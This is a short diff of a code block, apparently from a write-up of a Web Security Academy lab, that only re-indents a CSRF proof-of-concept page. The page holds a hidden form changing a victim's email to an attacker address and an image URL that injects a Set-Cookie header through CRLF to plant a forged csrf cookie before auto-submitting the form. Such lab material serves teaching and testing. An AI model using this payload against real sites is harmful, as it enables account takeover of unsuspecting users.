@@ -14,6 +14,6 @@
     <form action="https://0ae800630314cfa683893c200074004f.web-security-academy.net/my-account/change-email" method="POST">
     <input type="hidden" name="email" value="evil@hacker.net" />
     <input type="hidden" name="csrf" value="fake" />
-</form>
-<img src="https://0ae800630314cfa683893c200074004f.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();" />
+    </form>
+    <img src="https://0ae800630314cfa683893c200074004f.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();" />
     ```
